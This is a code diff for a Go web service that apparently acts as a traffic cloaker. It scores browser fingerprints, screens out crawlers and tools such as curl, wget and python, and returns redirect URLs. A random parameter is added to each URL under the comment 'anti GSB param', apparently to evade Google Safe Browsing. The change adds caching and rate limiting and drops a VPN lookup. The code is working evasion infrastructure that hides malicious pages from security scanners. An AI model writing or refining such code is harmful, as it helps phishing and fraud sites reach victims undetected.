@@ -6,6 +6,7 @@ import (
 	"net/http"
 	"os"
 	"strings"
+	"sync"
 	"time"
 )
 
@@ -17,6 +18,52 @@ type FPData struct {
 	TZ        string `json:"tz"`
 }
 
+// ===== SIMPLE CACHE =====
+type CacheItem struct {
+	Value   string
+	Expires time.Time
+}
+
+var cache = make(map[string]CacheItem)
+var mu sync.Mutex
+
+func getCache(key string) (string, bool) {
+	mu.Lock()
+	defer mu.Unlock()
+	item, ok := cache[key]
+	if !ok || time.Now().After(item.Expires) {
+		return "", false
+	}
+	return item.Value, true
+}
+
+func setCache(key, value string, ttl time.Duration) {
+	mu.Lock()
+	defer mu.Unlock()
+	cache[key] = CacheItem{Value: value, Expires: time.Now().Add(ttl)}
+}
+
+// ===== RATE LIMIT =====
+var rate = make(map[string]int)
+
+func allow(ip string) bool {
+	mu.Lock()
+	defer mu.Unlock()
+
+	rate[ip]++
+	if rate[ip] == 1 {
+		go func() {
+			time.Sleep(10 * time.Second)
+			mu.Lock()
+			delete(rate, ip)
+			mu.Unlock()
+		}()
+	}
+
+	return rate[ip] <= 5
+}
+
+// ===== DETECTION =====
 func isBotUA(ua string) bool {
 	bots := []string{"bot", "crawler", "spider", "curl", "wget", "python"}
 	for _, b := range bots {
@@ -44,28 +91,21 @@ func isFakeMobile(ua string) bool {
 	return false
 }
 
-// VPN API check
-func checkVPN(ip string) bool {
-	client := &http.Client{Timeout: 2 * time.Second}
-
-	resp, err := client.Get("https://ipapi.is/?q=" + ip)
-	if err != nil {
-		return false
-	}
-	defer resp.Body.Close()
-
-	var data map[string]interface{}
-	json.NewDecoder(resp.Body).Decode(&data)
-
-	if v, ok := data["is_vpn"].(bool); ok {
-		return v
-	}
-
-	return false
-}
-
-// FP handler
+// ===== HANDLER =====
 func fpHandler(w http.ResponseWriter, r *http.Request) {
+
+	ip := r.RemoteAddr
+
+	if !allow(ip) {
+		http.Error(w, "rate limited", http.StatusTooManyRequests)
+		return
+	}
+
+	// cache check
+	if val, ok := getCache(ip); ok {
+		json.NewEncoder(w).Encode(map[string]string{"redirect": val})
+		return
+	}
 
 	var body struct {
 		FP FPData `json:"fp"`
@@ -76,7 +116,6 @@ func fpHandler(w http.ResponseWriter, r *http.Request) {
 	json.NewDecoder(r.Body).Decode(&body)
 
 	ua := strings.ToLower(body.FP.Platform)
-	ip := r.RemoteAddr
 
 	score := 0
 
@@ -100,12 +139,7 @@ func fpHandler(w http.ResponseWriter, r *http.Request) {
 		score += 40
 	}
 
-	if checkVPN(ip) {
-		score += 30
-	}
-
 	mode := os.Getenv("MODE")
-
 	limit := 60
 
 	if mode == "light" {
@@ -129,12 +163,16 @@ func fpHandler(w http.ResponseWriter, r *http.Request) {
 		redirect = body.BL
 	}
 
-	// anti GSB random param
+	// anti GSB param
 	if strings.Contains(redirect, "?") {
 		redirect = redirect + "&r=" + fmt.Sprint(time.Now().UnixNano())
 	} else {
 		redirect = redirect + "?r=" + fmt.Sprint(time.Now().UnixNano())
 	}
+
+	// cache result
+	setCache(ip, redirect, 5*time.Minute)
+
 	json.NewEncoder(w).Encode(map[string]string{
 		"redirect": redirect,
 	})
@@ -144,5 +182,11 @@ func main() {
 
 	http.HandleFunc("/fp", fpHandler)
 
-	http.ListenAndServe(":8080", nil)
+	server := &http.Server{
+		Addr:         ":8080",
+		ReadTimeout:  2 * time.Second,
+		WriteTimeout: 2 * time.Second,
+	}
+
+	server.ListenAndServe()
 }
